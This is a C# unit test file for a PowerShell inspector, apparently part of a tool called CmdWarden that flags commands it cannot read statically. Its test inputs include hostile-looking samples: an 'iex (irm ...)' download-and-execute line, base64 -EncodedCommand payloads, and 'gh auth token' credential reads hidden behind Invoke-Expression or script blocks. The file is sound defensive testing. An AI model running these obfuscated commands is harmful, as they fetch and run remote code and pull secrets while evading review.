using System.Text;
using CmdWarden.Agent.Identity;

namespace CmdWarden.Tests;

/// <summary>#31: find PowerShell code that CmdWarden cannot read.</summary>
public class PowerShellInspectorTests
{
    private static string Encoded(string script) => Convert.ToBase64String(Encoding.Unicode.GetBytes(script));

    private static string? Opaque(string exe, params string[] args) =>
        PowerShellInspector.FindOpaquePart(exe, args, path => path switch
        {
            "plain.ps1" => "gh pr list",
            "hidden.ps1" => "$c = 'gh auth token'; iex $c",
            _ => null,
        });

    [Fact]
    public void Readable_commands_are_not_opaque()
    {
        Assert.Null(Opaque("pwsh.exe", "-NoProfile", "-Command", "gh pr list"));
        Assert.Null(Opaque("pwsh.exe", "-ExecutionPolicy", "Bypass", "-c", "gh", "pr", "list"));
        Assert.Null(Opaque("pwsh.exe", "-c", "& 'gh' auth token"));
        Assert.Null(Opaque("pwsh.exe", "-c", "Get-ChildItem | ForEach-Object { gh issue view $_.Name }"));
        Assert.Null(Opaque("pwsh.exe", "-File", "plain.ps1"));
        Assert.Null(Opaque("pwsh.exe", "plain.ps1"));
        Assert.Null(Opaque("powershell.exe", "gh", "pr", "list"));
        Assert.Null(Opaque("pwsh.exe"));
        Assert.Null(Opaque("pwsh.exe", "-NoLogo", "-NoExit"));
    }

    [Theory]
    [InlineData("-EncodedCommand")]
    [InlineData("-enc")]
    [InlineData("-e")]
    [InlineData("-ec")]
    [InlineData("/EncodedCommand")]
    public void Encoded_command_is_opaque(string flag) =>
        Assert.Contains("encoded", Opaque("pwsh.exe", "-NoProfile", flag, Encoded("gh auth token")));

    [Theory]
    [InlineData("iex (irm https://example.test/x.ps1)", "Invoke-Expression")]
    [InlineData("Invoke-Expression 'gh auth token'", "Invoke-Expression")]
    [InlineData("& $g auth token", "built at run time")]
    [InlineData("& ('g' + 'h') auth token", "built at run time")]
    [InlineData(". \"$env:TEMP/x.ps1\"", "built at run time")]
    [InlineData("[ScriptBlock]::Create('gh auth token').Invoke()", "script block")]
    [InlineData("$ExecutionContext.InvokeCommand.InvokeScript('gh auth token')", "from a string")]
    [InlineData("$o.$m()", "method")]
    [InlineData("pwsh -enc ZQBjAGgAbwA=", "nested PowerShell")]
    [InlineData("gh pr list (", "does not parse")]
    [InlineData("-", "standard input")]
    public void Hidden_parts_in_a_command_are_opaque(string script, string reason) =>
        Assert.Contains(reason, Opaque("pwsh.exe", "-Command", script));

    [Fact]
    public void Hidden_or_unreadable_script_file_is_opaque()
    {
        Assert.Contains("Invoke-Expression", Opaque("pwsh.exe", "-File", "hidden.ps1"));
        Assert.Contains("cannot be read", Opaque("pwsh.exe", "-File", "missing.ps1"));
    }

    [Fact]
    public void Command_line_of_this_process_reads_and_splits()
    {
        if (!OperatingSystem.IsWindows())
            return;
        var line = PowerShellInspector.ReadCommandLine(Environment.ProcessId);
        Assert.False(string.IsNullOrWhiteSpace(line));
        Assert.NotEmpty(PowerShellInspector.SplitCommandLine(line!));
        Assert.Equal(["a b", "c"], PowerShellInspector.SplitCommandLine("x.exe \"a b\" c").Skip(1));
    }
}
